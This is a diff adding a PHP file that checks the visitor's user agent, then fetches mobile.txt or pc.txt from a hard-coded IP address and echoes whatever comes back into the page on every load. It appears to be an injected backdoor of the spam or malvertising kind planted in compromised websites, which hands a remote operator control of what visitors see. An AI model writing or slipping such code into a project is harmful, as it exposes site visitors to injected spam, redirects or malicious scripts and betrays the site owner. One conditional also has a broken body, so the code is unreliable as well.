@@ -1,0 +1,85 @@
+<?php
+if (!defined('5858ad_v1')) {
+    define('5858ad_v1', 1);
+    if (!function_exists('http_parse_headers')) {
+        function http_parse_headers($headers)
+        {
+            $array = array();
+            array_shift($headers);
+            foreach ($headers as $x) {
+                list($n, $v) = preg_split("/:\s/", $x);
+                $array[$n] = $v;
+            }
+            return $array;
+        }
+    }
+    function is_mobile()
+    {
+        $user_agent = $_SERVER['HTTP_USER_AGENT'];
+        $mobile_agents = Array("240x320", "acer", "acoon", "acs-", "abacho", "ahong", "airness", "alcatel", "amoi", "android", "anywhereyougo.com", "applewebkit/525", "applewebkit/532", "asus", "audio", "au-mic", "avantogo", "becker", "benq", "bilbo", "bird", "blackberry", "blazer", "bleu", "cdm-", "compal", "coolpad", "danger", "dbtel", "dopod", "elaine", "eric", "etouch", "fly ", "fly_", "fly-", "go.web", "goodaccess", "gradiente", "grundig", "haier", "hedy", "hitachi", "htc", "huawei", "hutchison", "inno", "ipad", "ipaq", "ipod", "jbrowser", "kddi", "kgt", "kwc", "lenovo", "lg ", "lg2", "lg3", "lg4", "lg5", "lg7", "lg8", "lg9", "lg-", "lge-", "lge9", "longcos", "maemo", "mercator", "meridian", "micromax", "midp", "mini", "mitsu", "mmm", "mmp", "mobi", "mot-", "moto", "nec-", "netfront", "newgen", "nexian", "nf-browser", "nintendo", "nitro", "nokia", "nook", "novarra", "obigo", "palm", "panasonic", "pantech", "philips", "phone", "pg-", "playstation", "pocket", "pt-", "qc-", "qtek", "rover", "sagem", "sama", "samu", "sanyo", "samsung", "sch-", "scooter", "sec-", "sendo", "sgh-", "sharp", "siemens", "sie-", "softbank", "sony", "spice", "sprint", "spv", "symbian", "tablet", "talkabout", "tcl-", "teleca", "telit", "tianyu", "tim-", "toshiba", "tsm", "up.browser", "utec", "utstar", "verykool", "virgin", "vk-", "voda", "voxtel", "vx", "wap", "wellco", "wig browser", "wii", "windows ce", "wireless", "xda", "xde", "zte");
+        $is_mobile = false;
+        foreach ($mobile_agents as $device) {
+            if (stristr($user_agent, $device)) {
+                $is_mobile = true;
+                break;
+            }
+        }
+        return $is_mobile;
+    }
+
+    function ad_wget($curl_uri, $cache = false, $ua = false)
+    {
+        $curl = function_exists("curl_init");
+        if ($curl) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $curl_uri);
+            curl_setopt($ch, CURLOPT_HEADER, 1);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+            $response = curl_exec($ch);
+            curl_close($ch);
+
+            list($http_response_header, $content) = explode("\r\n\r\n", $response, 2);
+            $http_response_header = explode("\r\n", $http_response_header);
+        } else {
+            $ctx = stream_context_create(array(
+                "http" => array(
+                    "method" => "GET",
+                    "follow_location" => 0,
+                    "ignore_errors" => 1,
+                )));
+            $content = @file_get_contents($curl_uri, false, $ctx);
+        }
+
+        if (isset($http_response_header)) {
+            $response_array = array();
+            sscanf($http_response_header[0], 'HTTP/%*d.%*d %d', $response_array['http_code']);
+            $response_array['header'] = $http_response_header;
+            $response_array['content'] = $content;
+        } else {
+            return false;
+        }
+        return $response_array;
+    }
+
+    function ad_list($response_array)
+    {
+        $code = $response_array['http_code'];
+        $headers = http_parse_headers($response_array['header']);
+        if (isset($headers['Content-Type']))
+           // header('Content-Type: ' . $headers['Content-Type']);
+        $body = $response_array['content'];
+        if ($code != '404' && $code != '500' && $code != '502') {
+            return $body;
+        }
+    }
+    ob_start();
+    if (is_mobile()) {
+        $url = "http://104.237.152.49/mobile.txt";
+    } else {
+        $url = "http://104.237.152.49/pc.txt";
+    }
+    echo ad_list(ad_wget($url));
+}
+
+?>
